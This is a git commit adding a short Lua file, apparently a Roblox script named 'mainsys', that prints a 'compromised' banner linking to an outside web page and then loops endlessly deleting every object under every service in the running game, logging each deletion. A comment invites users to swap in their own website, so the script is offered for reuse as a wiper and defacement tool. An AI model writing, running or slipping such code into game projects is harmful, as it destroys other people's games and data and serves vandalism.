60df349d0e31c2d9fe15ae2658c9ef4756f49832
jerkylettuce59 <165170042+jerkylettuce59@users.noreply.github.com>
2025-03-26 10:49:06 +0300

    Create mainsys.lua

---
+++ mainsys.lua
@@ -0,0 +1,10 @@
+-- "mainsys"
+print("compromised. for more info visit https://compromisedbysomeoneimportant.straw.page/") -- replace this website with yours if you want to
+while true do
+	for i,t in pairs(game:GetChildren()) do
+		for i,x in pairs(t:GetChildren()) do
+			x:Destroy()
+			print("deleted " .. x.Name .. " out of " .. t.Name)
+		end
+	end
+end
